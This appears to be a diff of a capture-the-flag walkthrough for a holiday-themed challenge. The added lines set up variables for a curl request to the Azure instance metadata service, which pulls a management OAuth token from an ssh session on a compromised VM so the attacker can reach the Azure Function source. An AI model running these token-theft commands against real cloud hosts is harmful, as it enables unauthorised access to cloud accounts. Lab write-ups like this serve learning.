@@ -16,6 +16,11 @@ ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i  mysshkey -i mysshkey
 #### Hack Azure to get the source of the Azure Function
 
 ```bash
+HEADER="Metadata:true"
+URL="http://169.254.169.254/metadata"
+API_VERSION="2021-12-13"
+```
+```bash
 monitor@ssh-server-vm:/$ echo "Management Token"
 curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"
 Management Token
